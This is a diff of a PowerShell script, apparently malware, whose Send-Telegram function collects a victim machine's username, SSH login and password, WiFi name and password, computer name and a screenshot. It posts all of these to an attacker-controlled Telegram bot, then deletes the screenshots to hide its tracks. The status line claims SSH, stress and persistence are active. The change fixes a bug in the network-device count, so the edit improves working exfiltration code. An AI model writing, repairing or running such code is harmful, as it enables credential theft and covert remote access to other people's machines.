@@ -101,33 +101,32 @@ function Setup-SSH {
 
 # Send to Telegram
 function Send-Telegram($info, $screenshot) {
+  $networkDevices = Get-NetworkDevices
+
   $msg = @"
 **🔥 $($info.Host) FULL REPORT** 🔥
 
 👤 **Username:** $($info.User)
 🔐 **SSH Login:** $($info.SSHUser)@$($info.IP)
    Password: $($info.SSHPass)
-📱 **WiFi:** $($info.WiFiSSID) 
+📱 **WiFi:** $($info.WiFiSSID)
    **Password: $($info.WiFiPass)**
 💻 **Computer:** $($info.PC)
 📍 **Status:** SSH + Stress + Persistence ACTIVE
 
-Network Scan: $($Get-NetworkDevices.Count) devices found
+Network Scan: $($networkDevices.Count) devices found
 "@
   
-  # Send Text
   $uri = "https://api.telegram.org/bot$BotToken/sendMessage"
   $body = @{ chat_id = $ChatID; text = $msg; parse_mode = "Markdown" } | ConvertTo-Json
   Invoke-RestMethod -Uri $uri -Method Post -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue
-  
-  # Send Screenshot
+
   if (Test-Path $screenshot) {
     $photoUri = "https://api.telegram.org/bot$BotToken/sendPhoto"
     $photoBody = @{ chat_id = $ChatID; caption = "🖥️ $($info.Host) | SSH: $($info.SSHUser)@$($info.IP)" }
     $photoBody.photo = Get-Item $screenshot
     Invoke-RestMethod -Uri $photoUri -Method Post -Form $photoBody -ErrorAction SilentlyContinue
-    
-    # Delete screenshot after success
+
     Get-ChildItem $ScreenshotDir -Filter "*.png" | Remove-Item -Force -ErrorAction SilentlyContinue
     Write-Log "Screenshot sent and deleted"
   }
